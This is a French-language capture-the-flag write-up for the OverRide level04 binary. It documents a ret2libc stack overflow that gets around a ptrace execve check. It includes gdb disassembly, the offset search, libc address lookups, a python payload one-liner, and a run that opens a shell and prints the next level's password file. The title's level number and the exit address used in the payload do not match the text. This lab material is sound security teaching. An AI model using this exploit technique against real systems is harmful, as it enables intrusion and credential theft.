# level03: RET2LIBC

### Première étape — tester le programme

```bash
level04@OverRide:~$ ./level04 
Give me some shellcode, k
test?
child is exiting...
level04@OverRide:~$ 
```

Rien de tres interessant pour rien changer

> _**REMARQUE:**_ Child is exiting ... ? Cette phrase est interessante le programme doit utiliser des forks. Voyons sa de plus pres !

---
### Ouvrir GDB

<details>

<summary> Voir le code nasm </summary>

```s
0x080486c8 <+0>:	push   %ebp
0x080486c9 <+1>:	mov    %esp,%ebp
0x080486cb <+3>:	push   %edi
0x080486cc <+4>:	push   %ebx
0x080486cd <+5>:	and    $0xfffffff0,%esp
0x080486d0 <+8>:	sub    $0xb0,%esp
0x080486d6 <+14>:	call   0x8048550 <fork@plt>
0x080486db <+19>:	mov    %eax,0xac(%esp)
0x080486e2 <+26>:	lea    0x20(%esp),%ebx
0x080486e6 <+30>:	mov    $0x0,%eax
0x080486eb <+35>:	mov    $0x20,%edx
0x080486f0 <+40>:	mov    %ebx,%edi
0x080486f2 <+42>:	mov    %edx,%ecx
0x080486f4 <+44>:	rep stos %eax,%es:(%edi)
0x080486f6 <+46>:	movl   $0x0,0xa8(%esp)
0x08048701 <+57>:	movl   $0x0,0x1c(%esp)
0x08048709 <+65>:	cmpl   $0x0,0xac(%esp)
0x08048711 <+73>:	jne    0x8048769 <main+161>
0x08048713 <+75>:	movl   $0x1,0x4(%esp)
0x0804871b <+83>:	movl   $0x1,(%esp)
0x08048722 <+90>:	call   0x8048540 <prctl@plt>
0x08048727 <+95>:	movl   $0x0,0xc(%esp)
0x0804872f <+103>:	movl   $0x0,0x8(%esp)
0x08048737 <+111>:	movl   $0x0,0x4(%esp)
0x0804873f <+119>:	movl   $0x0,(%esp)
0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
0x0804874b <+131>:	movl   $0x8048903,(%esp)
0x08048752 <+138>:	call   0x8048500 <puts@plt>
0x08048757 <+143>:	lea    0x20(%esp),%eax
0x0804875b <+147>:	mov    %eax,(%esp)
0x0804875e <+150>:	call   0x80484b0 <gets@plt>
0x08048763 <+155>:	jmp    0x804881a <main+338>
0x08048768 <+160>:	nop
0x08048769 <+161>:	lea    0x1c(%esp),%eax
0x0804876d <+165>:	mov    %eax,(%esp)
0x08048770 <+168>:	call   0x80484f0 <wait@plt>
0x08048775 <+173>:	mov    0x1c(%esp),%eax
0x08048779 <+177>:	mov    %eax,0xa0(%esp)
0x08048780 <+184>:	mov    0xa0(%esp),%eax
0x08048787 <+191>:	and    $0x7f,%eax
0x0804878a <+194>:	test   %eax,%eax
0x0804878c <+196>:	je     0x80487ac <main+228>
0x0804878e <+198>:	mov    0x1c(%esp),%eax
0x08048792 <+202>:	mov    %eax,0xa4(%esp)
0x08048799 <+209>:	mov    0xa4(%esp),%eax
0x080487a0 <+216>:	and    $0x7f,%eax
0x080487a3 <+219>:	add    $0x1,%eax
0x080487a6 <+222>:	sar    %al
0x080487a8 <+224>:	test   %al,%al
0x080487aa <+226>:	jle    0x80487ba <main+242>
0x080487ac <+228>:	movl   $0x804891d,(%esp)
0x080487b3 <+235>:	call   0x8048500 <puts@plt>
0x080487b8 <+240>:	jmp    0x804881a <main+338>
0x080487ba <+242>:	movl   $0x0,0xc(%esp)
0x080487c2 <+250>:	movl   $0x2c,0x8(%esp)
0x080487ca <+258>:	mov    0xac(%esp),%eax
0x080487d1 <+265>:	mov    %eax,0x4(%esp)
0x080487d5 <+269>:	movl   $0x3,(%esp)
0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
0x080487e1 <+281>:	mov    %eax,0xa8(%esp)
0x080487e8 <+288>:	cmpl   $0xb,0xa8(%esp)
0x080487f0 <+296>:	jne    0x8048768 <main+160>
0x080487f6 <+302>:	movl   $0x8048931,(%esp)
0x080487fd <+309>:	call   0x8048500 <puts@plt>
0x08048802 <+314>:	movl   $0x9,0x4(%esp)
0x0804880a <+322>:	mov    0xac(%esp),%eax
0x08048811 <+329>:	mov    %eax,(%esp)
0x08048814 <+332>:	call   0x8048520 <kill@plt>
0x08048819 <+337>:	nop
0x0804881a <+338>:	mov    $0x0,%eax
0x0804881f <+343>:	lea    -0x8(%ebp),%esp
0x08048822 <+346>:	pop    %ebx
0x08048823 <+347>:	pop    %edi
0x08048824 <+348>:	pop    %ebp
0x08048825 <+349>:	ret    
```
</details>

> _**REMARQUE:**_ Nous pouvons voir la fonction `gets` qui est utiliser par les childs du programme !

---
### ASEMBLY TO C

*Clique [**ICI**](./Ressources/main.c) si tu veux voir tous le code en **C***

---
### RET2LIBC

##### Qu'est ce que c'est que le **RET2LIBC** ?

Le ret2libc est une methode de la stackoverflow dans le bloc RET du programme pour executer des functions de la libc charger dans le programme.

##### Pourquoi utiliser le **RET2LIBC** aulieu du **RET2RET** ?

Lors des precedents level nous avons toujours opter pour un ret2ret to nopsled car monter le payload est plus simple a faire. Dans ce cas la nous avons un probleme qui nous empeche d'opter pour cette methode qui est le fonction `PTRACE_PEEKUSER` du parents.

##### Pourquoi **PTRACE_PEEKUSER** pose probleme ici ?
```c
................
syscall_num = ptrace(PTRACE_PEEKUSER, pid, OFFSET_EAX, 0);

if (syscall_num == SYSCALL_EXECVE) {
	puts("no exec() for you");
	// Tuer le process enfant si il utilise execve
	kill(pid, SIGKILL);
	break;
}
...............
```
Cette verification de `PTRACE_PEEKUSER` empeche l'enfant de vivre si celui ci appel le syscall (0xB) de la fonctions `execve` (*le plus utiliser pour ouvrir des shells dans les shellcodes*).

> _**REMARQUES:**_ *PTRACE_PEEKUSER* utilise OFFSET_EAX qui vaut dans un define a `4 * 11` pour accéder au registre EAX, qui contient le numéro du syscall en cours en 32 bits.

| Registre | Index | Taille | Offset | mémoire |
|:---------|:-----:|:------:|:------:|:--------|
EAX        |11     |4 octets|4 * 11  |= 44
ECX	       |12     |4 octets|4 * 12  |= 48
EIP	       |14	   |4 octets|4 * 14  |= 56
ESP	       |15	   |4 octets|4 * 15  |= 60

---
### OFFSET

_Pour trouver l'OFFSET nous avons besoin de suivre les childs dans gdb_

```bash
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 1937]
Give me some shellcode, k
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1937]
0x6e6e6e6e in ?? ()
```

- Notre OFFSET demarre a **156**
---
### PAYLOAD

##### Recherche des fonctions libc du binaire

Pour faire notre payload nous avons besoin de de piocher des fonctions de la libc qui peuvent nous etre utile pour ce dernier.

```bash
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```
Ok nous avons la fonction system charger de la libc, cette fonction est interessante car system appel bien execve mais dans un fork donc en soit nous pouvons bypass le syscall car celui ci n'est pas dans le meme proc que celui surveiller par `PTRACE_PEEKUSER`.

Il nous reste plus qu'a trouver l'arguments de system dans la libc directement l'ideal serrait `"/bin/sh"`

```bash
(gdb) info proc map
process 2020
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]

(gdb) find 0xf7e2c000,0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

Bingo l'adresse ou ce trouve la string `/bin/sh` ce trouve a l'adresse `0xf7f897ec` 🤝

Il nous faut une adresse de retour maintenant nous pouvons prendre par exemple exit.

```bash
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit # bingo
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit
```

##### construction du payload
- padding`[156]` overflow la stack pour atteindre et remplir eip (ret)
- EIP → system()`[0xf7e6aed0]`
- esp + 0x00  → exit()`[0xf7ee45c4]` *(utilisé comme adresse de retour)*
- esp + 0x04 → /bin/sh`[0xf7f897ec]` *(utilisé comme argument pour system)*


```bash
python -c 'print b"A"*156 + b"\xf7\xe6\xae\xd0"[::-1] + b"\xf7\xee\x45\xc4"[::-1] + b"\xf7\xf8\x97\xec"[::-1]' > /tmp/payload
```

Essayons le !

---

### EXEC

```bash
level04@OverRide:~$ cat /tmp/payload - | ./level04 Give me some shellcode, k
whoami 
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

**CONGRATULATIONS — you owned it ! 🎉**